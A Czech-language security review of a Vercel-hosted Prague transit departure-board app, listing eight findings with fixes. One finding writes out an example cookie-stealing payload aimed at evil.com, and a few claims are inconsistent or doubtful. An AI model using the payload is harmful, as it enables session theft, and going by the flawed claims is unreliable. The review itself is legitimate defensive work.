# Security Review — PID Departure Board App

**Datum:** 2026-11-21  
**Scope:** api/departureboards.js, vercel.json, CI/CD, build artifacts, git history  
**Metoda:** Statická analýza, npm audit, build inspection, git history scan

---

## Executive Summary

Aplikace má solidní bezpečnostní základ — žádné kritické zranitelnosti (npm audit clean), API klíč není v bundlu, .env správně ignorován, CSP/security headers nasazené. Nalezené problémy jsou především v **chybějícím rate limitingu**, **absenci timeoutu v proxy**, **leak HTTP status kódů z upstream API** a **nepinovaných CI závislostí**. Doporučuji prioritně řešit S1, S2, S4.

---

## Findings

### S1 — Chybějící timeout v proxy fetch (api/departureboards.js)
**Severity:** P1  
**File:** `api/departureboards.js:27`  
**Issue:** Upstream fetch nemá timeout — může viset donekonečna při zpomalení/výpadku Golemio API.

**Failure scenario:**  
Golemio API přestane odpovídat → fetch visí → Vercel serverless function běží až do global timeoutu (10–60s dle plánu) → uživatel vidí prázdnou obrazovku, concurrent requesty vyčerpají limit.

**Fix:**
```javascript
const upstreamResponse = await fetch(upstreamUrl, {
  method: 'GET',
  headers: { /* ... */ },
  signal: AbortSignal.timeout(5000), // 5s timeout
});
```

---

### S2 — Chybějící rate limiting
**Severity:** P1  
**File:** `api/departureboards.js` (celý endpoint)  
**Issue:** Žádný rate limit — útočník může spamovat `/api` requesty a vyčerpat Vercel function invocations nebo přetížit Golemio API.

**Abuse scenario:**  
Skript pošle 1000 requestů/s na `/api/departureboards?ids[]=U2823Z301&limit=200` → vyčerpá Vercel free tier (100k invocations/měsíc) nebo Golemio zablokuje IP kvůli rate limit abuse → aplikace spadne pro všechny uživatele.

**Fix:**
```javascript
// 1. Vercel Edge Config + KV rate limiter
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '1 m'), // 10 req/min per IP
});

// v handleru
const ip = req.headers['x-forwarded-for'] || 'unknown';
const { success } = await ratelimit.limit(ip);
if (!success) {
  return res.status(429).json({ error: 'Too many requests' });
}

// 2. Nebo jednodušší: Vercel API Rate Limiting přes vercel.json
{
  "functions": {
    "api/departureboards.js": {
      "maxDuration": 10,
      "memory": 128
    }
  }
}
// + client-side debounce (už implementováno v useDepartures.ts)
```

**Note:** Client-side debounce existuje, ale server-side ochrana chybí.

---

### S3 — Error leakage: upstream HTTP status kódy protečou do browseru
**Severity:** P2  
**File:** `api/departureboards.js:47`  
**Issue:** `res.status(upstreamResponse.status).send(text)` — předává HTTP 4xx/5xx z Golemio API včetně potenciálně citlivých error messages.

**Leak scenario:**  
Golemio vrátí `401 Unauthorized: Invalid token xyz123abc` → proxy pošle stejný text do browseru → útočník vidí fragment API tokenu nebo internal error message (např. stack trace při 500).

**Fix:**
```javascript
if (!upstreamResponse.ok) {
  const statusCode = upstreamResponse.status;
  const sanitizedError = statusCode === 401 || statusCode === 403
    ? 'PID API authorization failed.'
    : statusCode >= 500
    ? 'Upstream service unavailable.'
    : 'Invalid request.';
  return res.status(statusCode).json({ error: sanitizedError });
}
// Teprve pak send(text) pro 2xx
```

---

### S4 — Outdated dependencies (security updates dostupné)
**Severity:** P1  
**File:** `package.json`  
**Issue:** Několik balíčků má minor/major updaty, zejména `jsdom` (29.0.1 → 31.0.1) a `typescript` (6.0.2 → 7.0.2).

**Risk:**  
- `jsdom` je dev dependency pro testy, ale DoS/prototype pollution zranitelnosti v starších verzích mohou ovlivnit CI pipeline.  
- `@testing-library/jest-dom` 6.9.1 → 8.0.0 (major jump) může obsahovat security patche.

**Fix:**
```bash
npm update            # minor/patch
npm install jsdom@latest @testing-library/jest-dom@latest  # major
npm audit fix         # auto-fix known CVEs
npm run test          # verify
```

**Current status:** `npm audit --omit=dev` = 0 vulnerabilities, ale minor updaty mohou obsahovat neoznačené security patche.

---

### S5 — CSP obsahuje `'unsafe-inline'` pro `style-src`
**Severity:** P2  
**File:** `vercel.json:11`  
**Issue:** `style-src 'self' 'unsafe-inline'` — povoluje inline `<style>` tagy a `style=""` atributy, což oslabuje XSS ochranu.

**Attack scenario:**  
XSS útok (např. přes budoucí dynamický content) může vložit `<img style="background:url(https://evil.com/steal?cookie=...)">`  → CSP to neblokuje.

**Fix:**
```json
"Content-Security-Policy": "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.golemio.cz; img-src 'self' data:; frame-ancestors 'self'"
```

Pokud Tailwind/Vite generuje inline styles, použít nonce:
```javascript
// vite.config.ts
export default defineConfig({
  plugins: [
    react(),
    tailwindcss(),
    {
      name: 'csp-nonce',
      transformIndexHtml: {
        order: 'pre',
        handler: (html) => {
          const nonce = crypto.randomUUID();
          return html.replace('<style', `<style nonce="${nonce}"`);
        }
      }
    }
  ]
});
```

**Workaround akceptovatelný?** Ano, pokud není dynamický user-generated content. Aplikace má statický HTML + React JSX bez `dangerouslySetInnerHTML` → riziko XSS je nízké.

---

### S6 — CI workflow nepinuje verze GitHub Actions
**Severity:** P2  
**File:** `.github/workflows/ci.yml:13-14`  
**Issue:** `actions/checkout@v4` a `actions/setup-node@v4` používají tag místo commit SHA — maintainer může pushnout kompromitovanou verzi na v4 tag.

**Supply chain attack:**  
Útočník získá přístup k `actions/checkout` repo → pushne malware do v4 → další CI run stáhne kompromitovaný kód → credentials/secrets leaked.

**Fix:**
```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
```

Použít [pinact](https://github.com/mheap/pinact) nebo Dependabot pro automatický update.

---

### S7 — Chybějící explicitní CORS konfigurace v proxy
**Severity:** P2  
**File:** `api/departureboards.js` (celý handler)  
**Issue:** Žádné `Access-Control-Allow-Origin` headers — spoléhá na Vercel defaults (allow all pro serverless functions).

**Risk:**  
Pokud Vercel změní default → aplikace spadne. Pokud někdo embeduje `/api` do phishing stránky, může zneužít Golemio API quota.

**Fix:**
```javascript
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://nerad.vercel.app');  // nebo env var
  res.setHeader('Access-Control-Allow-Methods', 'GET');
  res.setHeader('Access-Control-Max-Age', '86400');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  // ... rest
}
```

---

### S8 — Chybějící Content-Type validation v proxy
**Severity:** P3 (Low)  
**File:** `api/departureboards.js:41`  
**Issue:** `res.setHeader('content-type', contentType)` — nekontroluje, že `contentType` z upstream je safe (např. `text/html` by mohl způsobit MIME confusion).

**Fix:**
```javascript
const contentType = upstreamResponse.headers.get('content-type') || 'application/json';
if (!contentType.includes('application/json')) {
  return res.status(502).json({ error: 'Invalid upstream response type' });
}
res.setHeader('content-type', 'application/json; charset=utf-8');
```

---

## Git History Audit

**Check:** `git log -p --all -S PID_API_KEY | head -50`  
**Result:** Žádné skutečné API key hodnoty nebyly nikdy commitnuty. Historie obsahuje pouze:
- Přidání `PID_API_KEY` do `.env.example` (placeholder text)  
- Dokumentační zmínky v AGENTS.md, README.md  
- Kód odkazující na `process.env.PID_API_KEY`

**Verdict:** ✅ Clean — žádný secret leak.

---

## Build Artifact Inspection

**Commands:**
```bash
npm run build
grep -r "PID_API_KEY\|X-Access-Token" dist/
grep -Ei "token|apikey|secret|password" dist/assets/*.js
```

**Result:**
- ✅ `PID_API_KEY` environment variable není v bundlu  
- ✅ Žádné hard-coded secrets  
- ⚠️ Minified React kód obsahuje generické stringy jako `"token"`, `"apikey"` (část React internals, nikoliv aplikační secrets)

**Verdict:** ✅ Bezpečný — API klíč zůstává pouze v serverless runtime (Vercel env vars) a Vite dev proxy (lokální `.env`).

---

## Dependency Audit

**Commands:**
```bash
npm audit --omit=dev
npm outdated
```

**npm audit:** 0 vulnerabilities ✅  
**npm outdated:** 18 balíčků má updaty (viz S4). Kritické:
- `jsdom` 29.0.1 → 31.0.1 (2 major verze pozadu)  
- `@testing-library/jest-dom` 6.9.1 → 8.0.0  
- `typescript` 6.0.2 → 7.0.2  
- `vite` 8.0.3 → 8.3.8

---

## Additional Observations (ne security bugs, ale best practices)

### ✅ Správně implementováno
- **Input validation v proxy:** `ALLOWED_PARAMS` whitelist (řádek 1)  
- **Stop/line ID validation:** `VALID_STOP_IDS`, `VALID_LINE_IDS`, `VALID_DIRECTIONS` v pidApi.ts  
- **.env správně ignorován:** `.gitignore` obsahuje `.env*`  
- **Security headers:** `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` v vercel.json  
- **CSP nasazeno:** Byť s `unsafe-inline`, stále lepší než nic  
- **AbortSignal.timeout v frontend fetch:** pidApi.ts:66 — 8s timeout

### 🟡 Doporučení k zlepšení (non-blocking)
1. **Logging sanitization:** logger.ts loguje `...args` bez filtrace — pokud někdo zaloguje `logger.debug(apiKey)`, leak do browser console. Zvážit sanitizer.  
2. **Přidat SRI (Subresource Integrity)** pro Google Fonts v index.html:
   ```html
   <link href="https://fonts.googleapis.com/css2?family=..." rel="stylesheet" 
         integrity="sha384-..." crossorigin="anonymous">
   ```
3. **Vercel env var rotation:** Přidat poznámku do docs o pravidelné rotaci `PID_API_KEY` (best practice).  
4. **GitHub branch protection:** Zapnout required reviews + status checks na `main` větvi.

---

## Priority Matrix

| ID | Severity | Effort | Priority |
|----|----------|--------|----------|
| S1 | P1 | Low    | **High** |
| S2 | P1 | Medium | **High** |
| S4 | P1 | Low    | **High** |
| S3 | P2 | Low    | Medium   |
| S5 | P2 | Medium | Medium   |
| S6 | P2 | Low    | Medium   |
| S7 | P2 | Low    | Low      |
| S8 | P3 | Low    | Low      |

---

## Recommended Action Plan

**Fáze 1 (immediate):**
1. ✅ Přidat timeout do proxy fetch (S1) — 5 min  
2. ✅ Updatnout dependencies (S4) — 10 min  
3. ✅ Sanitizovat error messages (S3) — 10 min

**Fáze 2 (this sprint):**
4. ✅ Implementovat rate limiting (S2) — pokud je budget na Upstash Redis, jinak klient-side throttle postačí  
5. ✅ Pin CI actions (S6) — 5 min  
6. ✅ Explicitní CORS headers (S7) — 5 min

**Fáze 3 (backlog):**
7. 🔄 Odstranit `unsafe-inline` z CSP (S5) — vyžaduje refactor Tailwind/Vite setup (1–2h)  
8. 🔄 Content-Type validation (S8) — nice-to-have

---

## Závěr

Aplikace **není kriticky zranitelná**, ale má mezery v **DoS ochraně** (chybějící timeout + rate limit) a **error handling** (leak upstream status kódů). Git history je čistá, build artefakty neobsahují secrets, CSP/security headers jsou nasazené. Doporučuji adresovat S1, S2, S3, S4 do 1 týdne.

**Overall Security Grade:** B+ (dobrý základ, 4 P1 findings k vyřešení)
